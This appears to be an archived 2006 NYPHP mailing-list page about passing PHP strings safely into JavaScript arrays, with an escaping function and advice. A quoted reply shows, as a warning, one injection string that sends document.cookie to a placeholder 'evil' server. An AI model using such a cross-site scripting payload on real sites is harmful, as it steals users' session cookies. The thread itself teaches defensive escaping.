@@ -1,0 +1,168 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+ <HEAD>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-51353372-3"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-51353372-3');
+</script>
+   <TITLE> [nycphp-talk] Passing JavaScript arrays
+   </TITLE>
+   <LINK REL="Index" HREF="http://nyphp.org/pipermail/talk/2006-July/index.html" >
+   <LINK REL="made" HREF="mailto:talk%40lists.nyphp.org?Subject=Re:%20Re%3A%20%5Bnyphp-talk%5D%20Passing%20JavaScript%20arrays&In-Reply-To=%3C001701c6a289%248bf90590%2468e4a144%40Rubicon%3E">
+   <META NAME="robots" CONTENT="index,nofollow">
+   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
+   <LINK REL="Previous"  HREF="018630.html">
+   <LINK REL="Next"  HREF="018647.html">
+ <meta name="description" content="PHP jobs stackware web application support and development forums for Mongo LAMP MySQL SQL Windows IIS Linux." />
+<meta name="author" content="Stackware Web Development - http://stackware.com" />
+<meta name="verify-v1" content="zWMoPwMn/dolscLkjLXTpRqgr9K8bzlzL1vM9WTjpHc=" />
+<meta name="msvalidate.01" content="F85F81C1D0BAB5C349E8395628845E27" />
+<meta name="y_key" content="265502be3db4fb6e" />
+</HEAD>
+         <BODY BGCOLOR="#ffffff">
+<h1 style="float: right; margin: 0; padding: 0 0 0 15px;"><a href="https://www.meetup.com/new-york-php/">NYCPHP Meetup</a></h1><h1><a href="http://www.nyphp.org">NYPHP.org</a></h1>
+   <H1>[nycphp-talk] Passing JavaScript arrays</H1>
+    <B>Peter Sawczynec</B> 
+    <A HREF="mailto:talk%40lists.nyphp.org?Subject=Re:%20Re%3A%20%5Bnyphp-talk%5D%20Passing%20JavaScript%20arrays&In-Reply-To=%3C001701c6a289%248bf90590%2468e4a144%40Rubicon%3E"
+       TITLE="[nycphp-talk] Passing JavaScript arrays">ps at pswebcode.com
+       </A><BR>
+    <I>Sat Jul  8 08:25:06 EDT 2006</I>
+    <P><UL>
+        <LI>Previous message: <A HREF="018630.html">[nycphp-talk] Passing JavaScript arrays
+</A></li>
+        <LI>Next message: <A HREF="018647.html">[nycphp-talk] Passing JavaScript arrays
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#18634">[ date ]</a>
+              <a href="thread.html#18634">[ thread ]</a>
+              <a href="subject.html#18634">[ subject ]</a>
+              <a href="author.html#18634">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--beginarticle-->
+<PRE>Another possible basic technique for the PHP to JavaScript string data
+transfer. 
+
+Once upon creating a JavaScripted slideshow that rewrote the innerHTML in
+div tags to change images and their complex multi-line descriptions, I found
+this ditty worked for dynamically creating the JavaScript array of
+image/text/HTML data.
+
+1) In PHP do: urlencode($str_with_HTML_and_special_chars)
+
+2) In the JavaScript do:
+replace(unescape($str_with_HTML_and_special_chars),'+',' ')
+
+Has not choked on anything.
+
+
+Warmest regards,
+ 
+Peter Sawczynec,
+Technology Director
+PSWebcode
+_Design &amp; Interface
+_Ecommerce
+_Database Management
+<A HREF="http://lists.nyphp.org/mailman/listinfo/talk">ps at pswebcode.com</A>
+718.796.1951
+www.pswebcode.com
+
+
+
+-----Original Message-----
+From: <A HREF="http://lists.nyphp.org/mailman/listinfo/talk">talk-bounces at lists.nyphp.org</A> [mailto:<A HREF="http://lists.nyphp.org/mailman/listinfo/talk">talk-bounces at lists.nyphp.org</A>] On
+Behalf Of Cliff Hirsch
+Sent: Friday, July 07, 2006 1:47 PM
+To: 'NYPHP Talk'
+Subject: Re: [nycphp-talk] Passing JavaScript arrays
+
+
+Thanks to all for the great responses -- very helpful. I've summarized
+below:
+
+&gt;<i> For security, do I just escape the output like any other variable
+</I>destined for the browser?
+
+It depends where its coming from and what you're using it for. For example,
+I have dynamic JS array's coming from the DB that may contain HTML, and will
+eventually populate drop-down menu's.  For these, I pass through a 'js
+cleansing' routine to trim, remove HTML tags, convert to UTF-8 (or
+whatever), remove any line-breaks and escape all quotes. But I'd be
+extremely wary if your JS data is coming from GET or POST.  I can see a
+variable like the following jacking a JS array:
+
+'); location='<A HREF="http://myevilserver.com/steal?your_cookies=">http://myevilserver.com/steal?your_cookies=</A>'+document.cookie;
+//
+
+If you're echoing a string from php into a javascript string var, you need
+to escape it. Here's an example. The escapeString function here is slightly
+modified from the one used in CakePHP's javascript helper:
+
+&lt;?php
+function escapeString($string) {
+   $escape = array(&quot;\r\n&quot; =&gt; '\n', &quot;\r&quot; =&gt; '\n', &quot;\n&quot; =&gt; '\n', '&quot;' =&gt; '\&quot;',
+&quot;'&quot; =&gt; &quot;\\'&quot;);
+   return str_replace(array_keys($escape), array_values($escape), $string);
+}
+
+$string = &quot;It's good to \&quot;escape\&quot; strings&quot;;
+?&gt;
+
+&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;
+// &lt;![CDATA[
+   var string = '&lt;?php echo escapeString($string); ?&gt;';
+   alert(string);
+// ]]&gt;
+&lt;/script&gt;
+
+If you don't want the JS to be inline, you can create a separate PHP file
+that only outputs JavaScript code:
+
+&lt;script type=&quot;text/javascript&quot; src=&quot;js.php&quot;&gt;&lt;/script&gt;
+
+Just make sure js.php has the following before you start outputting
+JavaScript:
+
+header('content-type:text/javascript');
+
+(From what I understand, Apache will by default cache .js files but force a
+request for .php templates.  This may affect the chi of your app..  man..)
+
+_______________________________________________
+New York PHP Community Talk Mailing List
+<A HREF="http://lists.nyphp.org/mailman/listinfo/talk">http://lists.nyphp.org/mailman/listinfo/talk</A>
+New York PHP Conference and Expo 2006
+<A HREF="http://www.nyphpcon.com">http://www.nyphpcon.com</A>
+Show Your Participation in New York PHP
+<A HREF="http://www.nyphp.org/show_participation.php">http://www.nyphp.org/show_participation.php</A>
+
+
+</PRE>
+
+<!--endarticle-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI>Previous message: <A HREF="018630.html">[nycphp-talk] Passing JavaScript arrays
+</A></li>
+	<LI>Next message: <A HREF="018647.html">[nycphp-talk] Passing JavaScript arrays
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#18634">[ date ]</a>
+              <a href="thread.html#18634">[ thread ]</a>
+              <a href="subject.html#18634">[ subject ]</a>
+              <a href="author.html#18634">[ author ]</a>
+         </LI>
+       </UL>
+
+<hr>
+<a href="http://lists.nyphp.org/mailman/listinfo/talk">More information about the talk
+mailing list</a><br>
+</body></html>
